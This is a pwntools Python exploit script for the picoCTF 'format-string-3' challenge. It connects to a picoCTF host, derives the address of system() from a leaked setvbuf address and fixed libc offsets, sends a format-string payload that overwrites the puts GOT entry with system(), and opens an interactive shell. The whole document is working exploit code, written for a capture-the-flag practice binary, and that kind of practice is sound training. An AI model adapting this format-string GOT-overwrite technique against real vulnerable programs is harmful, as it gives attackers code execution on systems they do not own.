from pwn import *

exe = ELF("./format-string-3")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

# p = process('./format-string-3')
p = remote('rhea.picoctf.net', 57125)
# p = gdb.debug('./format-string-3', '''
#     break *main+113
#     break *main+145
#     display/100xw $rbp-0x410
#     continue
# ''')

PRINTF_OFFSET = 38
GLIBC_SETVBUF = 0x000000000007a3f0
GLIBC_SYSTEM = 0x000000000004f760
FUNC_DIFFERENCE = GLIBC_SETVBUF - GLIBC_SYSTEM
PUTS_ADDRESS = 0x404018

p.clean_and_log(1)
got_setvbuf = int(input("What is the address of setvbuf?: "), 16)
got_system = got_setvbuf - FUNC_DIFFERENCE

assert got_setvbuf > got_system
log.info(f"system() address: 0x{got_system:x}")

payload = fmtstr_payload(PRINTF_OFFSET, {PUTS_ADDRESS : got_system})
p.sendline(payload)
p.interactive()
